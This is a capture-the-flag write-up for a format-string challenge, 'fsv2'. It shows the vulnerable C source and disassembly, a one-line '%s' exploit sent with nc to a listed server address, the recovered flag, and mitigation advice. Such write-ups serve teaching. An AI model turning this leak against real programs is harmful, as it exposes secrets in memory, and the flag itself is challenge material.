# fsv2 — Format String Writeup

**Category:** Binary Exploitation (pwn) — chall2 of the chained series
**Technique:** Format string information leak (`%s` on an attacker-controlled format)
**Server:** `nc 18.226.103.146 9002`
**Secret recovered:** `f0rm4tStr1ngVulN3r4b1lityIsSc4rY`

---

## Challenge

We're given `fsvchall2` and its source `fsvchall2.c`:

```c
void vuln(const char *secret) {
    char input[256];
    printf("Input: ");
    if (fgets(input, sizeof(input), stdin) == NULL)
        return;
    printf(input, secret);        // <-- user-controlled format string
    printf("\n");
}

int main(void) {
    char secret[256];
    FILE *fp = fopen("/opt/ctf/chall2/secret.txt", "r");
    ...
    fgets(secret, sizeof(secret), fp);
    vuln(secret);
}
```

`main` loads the secret from disk and passes it to `vuln`, which prints
user input **as a format string**: `printf(input, secret)`.

## The bug

`printf(input, secret)` uses attacker-controlled `input` as the format. The one
"real" variadic argument supplied is `secret`. On the x86-64 System V ABI the first
variadic argument after the format sits in **`rsi`**, so a single `%s` conversion
dereferences `rsi` and prints the secret string directly.

### Confirming via disassembly of `vuln`

```asm
lea    rax,[rbp-0x110]      ; input buffer
mov    rdi,rax              ; rdi = format  = input
...
mov    rdx,QWORD PTR [rbp-0x118]   ; the `secret` pointer arg
mov    rsi,rdx              ; rsi = secret   (1st variadic arg)
call   printf               ; printf(input, secret)
```

`rdi = input`, `rsi = secret` — so `%s` prints the secret.

## Exploit

The entire payload is one specifier:

```bash
printf '%%s\n' | nc 18.226.103.146 9002
```

### Result

```
Input: f0rm4tStr1ngVulN3r4b1lityIsSc4rY
```

**Secret:** `f0rm4tStr1ngVulN3r4b1lityIsSc4rY`

(The binary is PIE with a stack canary, but none of that matters — no overflow is
needed, just a format-string read of the register argument.)

## Notes

- `fsvchall2` reads `/opt/ctf/chall2/secret.txt`, which only exists on the server, so
  the leak must be done live against the remote.
- This is **chall2** of a chained series (chall1 = the "Corn Maze" function-pointer
  overwrite); each stage's recovered secret unlocks the next.

## Mitigation

Never pass user input as a format string. Use `printf("%s", input)`. Compilers warn
on this with `-Wformat -Wformat-security`.
